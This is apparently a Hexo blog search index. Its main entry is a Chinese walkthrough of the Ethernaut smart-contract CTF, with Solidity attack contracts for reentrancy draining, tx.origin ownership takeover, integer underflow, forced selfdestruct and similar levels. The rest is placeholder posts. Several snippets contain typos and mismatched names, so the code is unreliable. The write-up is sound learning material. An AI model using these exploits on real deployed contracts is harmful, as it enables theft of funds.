<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>boke</title>
      <link href="/2024/08/01/boke/"/>
      <url>/2024/08/01/boke/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut靶场题解</title>
      <link href="/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a><a href="https://ethernaut.openzeppelin.com/">Ethernaut</a></h1><h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>要求是，成为这个合约的所有者，并使这个合约的钱为零</p><p>分析;<br>从这个合约中可以看到，要成为owner<br>1，我们的钱必须大于合约持有者的钱，但是最开始合约本身就有1000ether，这个时候就走contribute函数不行，因为我们没有那么多钱<br>2，此时发现receive，只要我们的钱和合约的钱大于0，就可以成为这个合约的持有者</p><p>方法：<br>1，在remix上不能部署这个合约，因为部署后，合约初始化，owner就是我们自己了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">      contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>直接使用合约地址<strong>At Adress</strong><br>2,调用contribute函数，转账1wei；<br>2,调用receive函数，转账1wei,就完成了,注意记得将钱收回来</p><hr><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>要求是，成为这个合约的所有者</p><p>分析：<br>注意这个的solidity的版本是0.6，没有影响关系，只是构造函数的写法不一样，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//solidity 0.8</span><br><span class="line">  constructor foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">//solidity 0.6</span><br><span class="line">  function foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>看与owner相关的函数，再去分析构造的合约名字Fallout，仔细发现有个Fal1out的函数，它实际上是命名错误的，这个时候我们就可以调动这个函数，刚好成为合约的所有者</p><p>方法：直接部署不行，因为里面有其他的import，所以我们就外部调用这个合约，使用接口,另创建一个合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Fallout &#123;</span><br><span class="line">    function owner() external view returns(address) //观察所有者的地址是否为我们</span><br><span class="line">    function Fal1out() external payable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>要求是，连续猜对10次猜对硬币的结果</p><p>分析：就是要想办法调用flip()函数10次，让猜测的结果与side一致</p><p>方法：直接上攻击合约,在目标合约内,部署攻击合约，就是一样的调用目标合约的flip函数之后，得到的guess在进入一样的目标合约之中，这样我们的猜测值guess就与side一样了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contact Hack &#123;</span><br><span class="line">  CoinFlip private immutable target;</span><br><span class="line">  FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = CoinFlip(_target);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function flip external &#123;</span><br><span class="line">    bool guess = _guess();</span><br><span class="line">    require(target.flip(guess),&quot;guess failed&quot;);//保证攻击合约中的guess与初始合约的side一样</span><br><span class="line">    &#125;</span><br><span class="line">  // 复制初始合约的flip()函数</span><br><span class="line">  function _guess() view returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line">     return side;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>要求是，获得该合约的所有权</p><p>分析：代码还是挺短的，主要就是弄懂<strong>tx.origin</strong>是什么意思，<strong>tx.origin</strong>是发起交易的账户，<strong>msg.sender</strong>是当前直接调用这个合约的即时账户，只要这俩者不一样就成功了<br>详细解释：</p><ul><li>A调用B合约<br>*<br>tx.origin&#x3D;A<br>*<br>msg.sender&#x3D;A</li><li>A调用B合约，B合约调用C合约<br>*<br>tx.origin&#x3D;A<br>*<br>msg.sender&#x3D;B</li></ul><p>方法：直接调用Telephone合约，不能满足条件，所以我们要写一个攻击合约来调用Telephone合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    Telephone(_target).changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_target接受Telephone的地址，我们部署Hack合约，msg.sender就是我们的地址</p><hr><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>要求是，我们有20个代币，需要让代币余额增加到20以上</p><p>分析：还是看solidity版本，0.6版本没有内置Safemath,所以就可以执行溢出或者下溢的操作  </p><blockquote><p>Safemath:在Solidity 中，SafeMath是一个常用的库，用于防止整数溢出和下溢的安全数学运算工具。由于Solidity的整数类型（如 uint 和int ）是有限的，当进行加法、减法、乘法或除法运算时，如果操作结果超出了类型范围，就会导致溢出或下溢<br>如，0-1会导致下溢，就会生成最大的无符号整数，并且大于0</p></blockquote><p>方法：调用攻击合约中，再调用transfer函数，给msg.sender转账1个代币，由于攻击合约没有代币，就会发生下溢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">function balanceOf(address _) public view returns (uint256)</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">   Telephone(_target).transfer(msg.sender,1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>要求是，获得这个合约的所有权</p><p>分析：理解<a href="https://wtf.academy/docs/solidity-102/Delegatecall/">delegatecall</a>,就是调用pwm函数，通过触发fallback函数，然后进行委托用</p><p>方法：部署Delegate合约，但是不调用，我们是在delegation合约上调用pwn函数</p><hr><h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>要求是，使这个合约的余额大于零</p><p>分析：代码还是很简单，就是一个空合约，什么函数也没有，就考虑到自毁合约的功能  </p><blockquote><p>自毁合约：自毁合约是一种智能合约，通常基于区块链技术，其设计初衷是在特定条件下自动执行某些预定的操作，最终将合约自身的功能或者存储的资产销毁。这种合约的设计可以确保在特定情况发生时，例如某个时间点到达、某个条件达成或者特定的事件发生，合约内部的资产或者代码可以被永久删除或者无法访问。</p></blockquote><p>方法：使用通过selfdestructh功能删除一个合约，合约内所有的余额将被强制发送到另一个合约，就是写一个攻击合约自毁</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable _target) payable&#123;</span><br><span class="line">      selfdestruct(_target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署攻击合约时记得发送1wei</p><hr><h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>要求是，解锁保险箱</p><p>分析：password是个私有变量，不能直接获取，但是它也是个状态变量，可以访问的，通过回到ethernaut网站，在控制台获得密码即可</p><p>方法：在控制台输入 <code>await web3.eth.getStorageAt(contract.address,1)</code>, 获得密码</p><hr><h2 id="king"><a href="#king" class="headerlink" title="king"></a>king</h2><p>要求是，破坏游戏规则</p><p>分析：通过合约来看就是阻碍别人调用receive函数,拒接别人的转账,</p><p>方法：写一个攻击合约,不要有fallback,receive函数，防止新玩家转账，成为新国王</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable target) payable&#123;</span><br><span class="line">      uint prize = King(target).prize();</span><br><span class="line">      (bool ok,)=target.call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class="line">      require(ok,&quot;call failed&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在执行攻击合约时，首先检查当前的奖金值，然后部署攻击合约时，发送该奖金值</p><hr><h3 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h3><p>要求是：窃取合约中的所有资金</p><p>分析：这是一个典型的重入攻击  </p><blockquote><p>重入攻击：重入攻击的典型示例是以太坊的智能合约中发生的情况。以太坊的智能合约是按照以太币（ETH）的传统交易方式执行的，合约可以调用其他合约或发送ETH到外部账户。如果一个合约在调用外部合约时先转移ETH给另一个合约，并且在接收ETH后再执行其他逻辑，那么这个外部合约可以在接收ETH后调用原合约，重新执行发送ETH的逻辑，导致重复的ETH转移，从而造成资金损失。<br>通过不断调用withdraw函数,窃取资金</p></blockquote><p>方法: 写一个攻击合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:   MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IReentrance &#123;</span><br><span class="line">  function donate(address) public payable;</span><br><span class="line">  function withdraw(uint256) public;</span><br><span class="line">&#125;</span><br><span class="line">contract Hack &#123;</span><br><span class="line">  IReetrance private immutable target;</span><br><span class="line"></span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">    target = IReetrance(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() external payable &#123;</span><br><span class="line">    target.donate&#123;value: 1e18&#125;(address(this));</span><br><span class="line">    target.withdraw(1e18);</span><br><span class="line">    require(address(target).balance == 0,&quot;target balance &gt;0&quot;);</span><br><span class="line">    selfdesctruct(paybale(msg.sender));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external paybale &#123;</span><br><span class="line">    uint prize = min(1e18,address(target).balance);</span><br><span class="line">    if(prize &gt; 0)&#123;</span><br><span class="line">    target.withdraw(prize);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function min(uint x,uint y) private pure returns(uint) &#123;</span><br><span class="line">     return x&lt;=y ? x:y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署攻击合约,调用attack函数发送1ether,即可</p><hr><h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>要求是,到达建筑物的顶楼</p><p>分析:第一次的building.isLastFloor(_floor)要为false,满足if的条件,第二次的building.isLastFloor(_floor)要为ture,使电梯到楼顶</p><p>方法: 就是在攻击合约中写isLastFloor函数,达到要求,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  Elevator private immutable target;</span><br><span class="line">  uint private count;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = Elevateor(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() external &#123;</span><br><span class="line">    target.goTo(1);</span><br><span class="line">    require(target.top(),&quot;NOT TOP&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function isLastFloor(uint) external returns(bool)&#123;</span><br><span class="line">    count++;</span><br><span class="line">    return count &gt; 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>要求是,解锁该合约</p><p>分析:就是将locked初始值ture,改为false,调用unlock函数</p><p>方法: 首先要知道每个私有状态可变的储存slot,如图:<br>![这是图片](C:\Users\ASUS\blog\source\09afcfa44c4d7ce14ff699e10fd1a22c.jpg “ slot)<br>再使用Web库来获取这个数据,然后截取为16字节,即为密钥,再调用unlock函数,将其作为参数传递即可</p><hr><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my fist blog</title>
      <link href="/2024/08/01/my-fist-blog/"/>
      <url>/2024/08/01/my-fist-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="先进入blog-cd-blog"><a href="#先进入blog-cd-blog" class="headerlink" title="先进入blog         cd blog"></a>先进入blog         cd blog</h2><h2 id="预览hexo-hexo-s"><a href="#预览hexo-hexo-s" class="headerlink" title="预览hexo             hexo s"></a>预览hexo             hexo s</h2><h2 id="创建文章题目-hexo-new-“”"><a href="#创建文章题目-hexo-new-“”" class="headerlink" title="创建文章题目        hexo new “”"></a>创建文章题目        hexo new “”</h2><h2 id="进入文章目录-cd-提目前，blog后的东西）题目-md"><a href="#进入文章目录-cd-提目前，blog后的东西）题目-md" class="headerlink" title="进入文章目录        cd   (提目前，blog后的东西）题目.md"></a>进入文章目录        cd   (提目前，blog后的东西）题目.md</h2><h2 id="写文章-notepad-题目-md"><a href="#写文章-notepad-题目-md" class="headerlink" title="写文章                  notepad 题目.md"></a>写文章                  notepad 题目.md</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/01/hello-world/"/>
      <url>/2024/08/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
